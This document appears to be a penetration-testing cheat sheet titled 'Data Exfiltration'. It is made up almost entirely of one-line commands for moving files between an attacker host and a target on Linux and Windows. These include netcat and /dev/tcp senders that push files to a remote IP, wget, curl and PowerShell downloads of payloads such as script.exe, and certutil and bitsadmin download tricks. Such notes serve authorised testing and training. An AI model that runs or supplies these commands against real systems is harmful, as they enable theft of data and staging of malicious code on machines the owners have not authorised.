# Data Exfiltration

## Web Server

```sh
python3 -m http.server 80
```

```bash
pipx install updog
updog
```
## FTP Server

```sh
pip install pyftpdlib
python3 -m pyftpdlib -p 21
```
## Linux File Transfer

#### wget

```sh
wget http://<ip>/script.exe
wget -r 10.0.0.3:1234
```
#### curl

```sh
curl 10.0.0.3/filename.ext -o filename.ext
curl -O http://<ip>/script.exe
```
#### scp

```sh
scp user@10.0.0.3:/filename.ext .
```
#### nc

```sh
# Receiver
nc -nvlp 4444 > filename.ext
# Sender
nc -nv 10.0.0.1 1234 < filename.ext

# vJ
# Receiver
nc -l -p 4444 -q 1 > something.zip < /dev/null
# Sender
cat something.zip | netcat <IP> 4444
```
#### /dev/tcp

```sh
# Receiver
nc -nvlp 1234 > filename.ext
# Sender
cat filename.ext > /dev/tcp/10.0.0.1/1234
```

```sh
# Sender
nc -w5 -nvlp 1234 < filename.ext
# Receiver
exec 6< /dev/tcp/10.0.0.1/1234
cat <&6 > filename.ext
```

## Windows File Transfer

#### Powershell

```powershell
iwr -uri http://<IP>/fichier -Outfile fichier

(New-Object Net.WebClient).DownloadFile('http://<IP>/fichier', 'fichier')
```
#### Curl

```powershell
curl -o fichier http://<IP>/fichier
```
#### certutil

```cmd
certutil -urlcache -split -f http://<IP>/fichier fichier
```
#### bitsadmin

```cmd
bitsadmin /transfer job /download /priority normal http://<IP>/fichier C:\Users\Public\fichier
```
